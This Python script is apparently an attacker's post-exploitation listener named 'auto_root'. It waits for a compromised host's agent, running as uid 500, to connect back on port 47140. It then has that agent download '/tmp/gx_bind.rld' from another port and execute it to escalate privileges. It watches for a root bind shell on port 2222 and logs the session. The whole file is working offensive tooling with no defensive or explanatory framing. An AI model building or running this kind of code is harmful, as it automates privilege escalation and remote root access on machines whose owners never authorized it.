#!/usr/bin/env python3
"""auto_root: on the uid500 agent connection (47140), fetch and run the root exploit."""
import socket, os, time, select, threading
PORT = 47140
CMDF = '/tmp/opencode/auto_root.cmd'
LOGF = '/tmp/opencode/auto_root.log'
lock = threading.Lock()
ran = [0.0]  # timestamp da ultima tentativa
def log(msg):
    with open(LOGF, 'ab', 0) as f:
        f.write((time.strftime('[%H:%M:%S] ') + msg + '\n').encode())
def port_up(port):
    s = socket.socket()
    s.settimeout(1)
    try:
        s.connect(('127.0.0.1', port)); s.close(); return True
    except Exception:
        return False
def handle(c, a):
    log(f'agent from {a}')
    c.setblocking(False)
    buf = b''
    # read the ready banner briefly
    t0 = time.time()
    while time.time() - t0 < 1.0:
        r, _, _ = select.select([c], [], [], 0.2)
        if r:
            try: d = c.recv(4096)
            except Exception: d = b''
            if not d: break
            buf += d
    log('banner: ' + repr(buf[:120]))
    if port_up(2222):
        log('2222 already up; not re-running')
        # keep the connection open
    else:
        with lock:
            now = time.time()
            do_run = (not ran[0]) or (now - ran[0] > 45)
            if do_run:
                ran[0] = now
        if do_run:
            log('sending fetch/run')
            try:
                c.sendall(b'fetch 47190 /tmp/gx_bind.rld\n')
                time.sleep(2.0)
                c.sendall(b'run /tmp/gx_bind.rld esc\n')
            except Exception as e:
                log('send error: %r' % (e,))
        else:
            log('already ran once; idle')
    # keep the connection open and log output
    c.setblocking(False)
    while True:
        r, _, _ = select.select([c], [], [], 1.0)
        if r:
            try: d = c.recv(65536)
            except Exception: d = b''
            if not d:
                log('agent disconnected')
                break
            with open(LOGF, 'ab', 0) as f: f.write(d)
        if port_up(2222) and not os.path.exists('/tmp/opencode/root_shell_up'):
            open('/tmp/opencode/root_shell_up','w').write(time.strftime('%H:%M:%S'))
            log('root shell 2222 is up')
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', PORT)); s.listen(8)
log(f'listening {PORT}')
while True:
    try: c, a = s.accept()
    except Exception: continue
    threading.Thread(target=handle, args=(c, a), daemon=True).start()
